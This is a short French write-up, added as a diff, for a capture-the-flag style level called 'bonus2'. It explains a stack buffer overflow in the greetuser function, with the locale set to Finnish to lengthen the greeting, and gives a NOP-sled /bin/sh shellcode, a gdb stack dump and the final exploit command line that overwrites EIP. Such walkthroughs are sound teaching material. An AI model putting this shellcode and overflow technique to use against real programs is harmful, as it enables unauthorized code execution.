@@ -1,0 +1,18 @@
+dans ce niveau il faut reecrire EIP de la fonction greetuser
+la premiere des choses a faire et de changer la langue contenue dans l'environnement en faisant
+export LANG="fi" ainsi le programme nous diras bonjour en finlandais ce qui est plus long a dire quand francais.
+
+une fois cela fais il nous faut blinder le premier argument le 1er strncpy va nous copier 40 caracteres de argv[1] et 2eme vous nous en copier 32
+la fonction greetuser va concatener nos 2 arguments complets a la suite de la phrase que le programme va nous dire. En finlandais le programme va nous dire "Hyvää päivää " suivie ensuite de nos 40 octects de l'argument 1 suivie de nos x octect de l'argument 2. Il suffit ensuite de trouver le bonne index qui correspond a notre EIP et d'executer un shellcode par exemple.
+
+export SHELLCODE=$(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
+
+(gdb) x/24 $esp
+0xbffff570:	0xbffff580	0xbffff5d0	0x00000001	0x00000000
+0xbffff580:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
+0xbffff590:	0x414120a4	0x41414141	0x41414141	0x41414141
+0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff5b0:	0x41414141	0x41414141	0x42424141	0x42424242
+0xbffff5c0:	0x42424242	0x42424242	0x42424242	0xbffff8d4 <-- EIP overflow
+
+./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c 'print("B" * 18 + "\xd4\xf8\xff\xbf")'`
